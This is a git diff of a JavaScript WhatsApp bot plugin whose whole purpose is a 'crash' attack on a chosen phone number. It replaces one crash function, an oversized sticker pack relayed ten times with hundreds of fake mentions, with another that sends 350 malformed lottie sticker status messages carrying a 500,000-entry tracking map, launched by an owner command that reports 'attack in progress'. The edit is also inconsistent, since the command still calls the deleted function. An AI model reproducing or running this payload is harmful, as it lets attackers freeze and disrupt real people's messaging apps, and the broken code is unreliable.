@@ -37,106 +37,71 @@ loadDevNumbers();
 // ============================================================
 // STICKER PACK CRASH FUNCTION (xxx)
 // ============================================================
-async function stickerPackCrash(conn, target) {
-    try {
-        const freez = {
-            stickerPackMessage: {
-                stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
-                name: "Shinigami".repeat(1000),
-                publisher: "SHINIGAMI - TEAM",
-                stickers: [
-                    {
-                        fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "SHINIGAMI - TEAM",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    },
-                    {
-                        fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
-                        isAnimated: false,
-                        emojis: [""],
-                        accessibilityLabel: "",
-                        isLottie: false,
-                        mimetype: "image/webp"
-                    }
-                ],
-                fileLength: "3662919",
-                fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
-                fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
-                mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
-                directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
-                contextInfo: {
-                    remoteJid: "X",
-                    participant: "0@s.whatsapp.net",
-                    stanzaId: "1234567890ABCDEF",
-                    mentionedJid: [
-                        "0@s.whatsapp.net",
-                        ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
-                    ]
-                }
+async function LsD(target) {
+  for (let p = 0; p < 350; p++) {
+    const PouMsg = {
+      lottieStickerMessage: {
+        message: {
+          stickerMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
+            fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
+            mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
+            mimetype: "application/was",
+            height: 1280,
+            width: 909,
+            directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
+            fileLength: "134544",
+            mediaKeyTimestamp: "1774806705",
+            isAnimated: true,
+            stickerSentTs: "1774806705729",
+            isAvatar: false,
+            isAiSticker: false,
+            isLottie: true,
+            contextInfo: {
+              remoteJid: "status@broadcast",
+              mentionedJid: [target],
+              urlTrackingMap: {
+                urlTrackingMapElements: Array.from(
+                  { length: 500000 },
+                  () => ({ "\0": "\0" })
+                )
+              }
             }
-        };
-        
-        // Send multiple times for more impact
-        for (let i = 0; i < 10; i++) {
-            await conn.relayMessage(target, freez, { participant: { jid: target } });
-            await sleep(200);
+          }
         }
-    } catch (e) {
-        console.log("stickerPackCrash error:", e.message);
-    }
+      }
+    };
+    await prim.relayMessage("status@broadcast", PouMsg, {
+        statusJidList: [target],
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { status_setting: "contacts" },
+            content: [
+              {
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: []
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
+    await sleep(30000);
+  }
 }
 
+                    
+// ============================================================
+// OWNER COMMAND: .sticker-crash
+// ============================================================
 // ============================================================
 // OWNER COMMAND: .sticker-crash
 // ============================================================
@@ -162,50 +127,29 @@ cmd({
     } else if (m.quoted) {
         target = m.quoted.sender;
     } else {
-        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ❌ Please provide a number
-│
-│ 📌 Example:
-│ • dyby-crash 55xxx 
-╰─────────────────────•`);
+        return reply(`❌ Usage:
+
+user: .dyby-crash 55xxxxxxxxxxx`);
     }
 
     // Check if target is a developer number
     if (isDevNumber(target)) {
-        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ 🛡️ Cannot attack developer number!
-│ This number is protected.
-╰─────────────────────•`);
+        return reply(`❌ Cannot attack developer number! This number is protected.`);
     }
 
     const targetNumber = target.split('@')[0];
     
     // Send attack started message
-    await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ☠️ DYBY CRASH ATTACK
-│
-│ 👤 Target: @${targetNumber}
-│ ⚡ Status: Attack in progress...
-╰─────────────────────•`);
+    await reply(`☘️ DYBY CRASH targeting: ${targetNumber}`);
 
     try {
         await stickerPackCrash(conn, target);
         
         // Send success message
-        await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ✅ DYBY CRASH COMPLETED!
-│ 👤 Target: @${targetNumber}
-│ 💀 Status: Crashed successfully
-╰─────────────────────•
-
-> POWERED BY SHINIGAMI MD`);
+        await reply(`☘️ DYBY CRASH completed on: ${targetNumber}`);
         
     } catch (e) {
         console.error("Sticker Crash Error:", e);
-        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
-│ ❌ DYBY CRASH FAILED
-│ 👤 Target: @${targetNumber}
-│ 💀 Error: ${e.message}
-╰─────────────────────•`);
+        reply(`❌ DYBY CRASH failed on: ${targetNumber} - Error: ${e.message}`);
     }
 });
